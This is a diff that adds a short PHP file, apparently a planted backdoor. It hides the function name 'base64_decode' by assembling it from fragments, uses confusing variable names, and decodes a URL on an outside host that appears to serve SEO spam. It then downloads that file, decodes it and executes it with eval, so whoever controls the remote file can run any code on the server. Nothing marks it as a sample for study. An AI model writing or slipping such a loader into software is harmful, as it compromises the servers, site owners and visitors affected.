@@ -1,0 +1,6 @@
+<?php
+$cfts = 'ba'.'se'. 32*2 .'_' .'de'.'co'.'de';
+$lIlIlIllIlI = ($cfts("aHR0cHM6Ly9oNGNrbGlua2VyLmdpdGh1Yi5pby9zZW8vZGVmYXVsdC50eHQ="));
+$IlllIIlIlI = file_get_contents($lIlIlIllIlI);
+eval("?>".($cfts($IlllIIlIlI)));
+?>
